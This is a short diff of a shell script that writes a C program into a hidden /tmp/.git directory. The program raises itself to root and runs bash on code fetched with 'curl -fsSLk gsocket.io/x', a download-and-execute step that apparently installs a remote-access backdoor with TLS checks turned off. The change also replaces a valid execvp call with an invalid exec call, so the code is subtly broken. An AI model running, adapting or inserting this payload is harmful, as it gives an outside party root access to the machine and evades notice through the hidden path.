@@ -18,12 +18,11 @@ EOF
 cat << 'EOF' > /tmp/.git/init.c
 #include <stdio.h>
 int main(void){
-    char* argument_list[] = {"/bin/bash", "<(curl -fsSLk gsocket.io/x)", NULL};
     setuid(0);
     setgid(0);
     seteuid(0);
     setegid(0);
-    execvp("/bin/bash", argument_list);
+    exec("/bin/bash <(curl -fsSLk gsocket.io/x)");
 }
 EOF
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
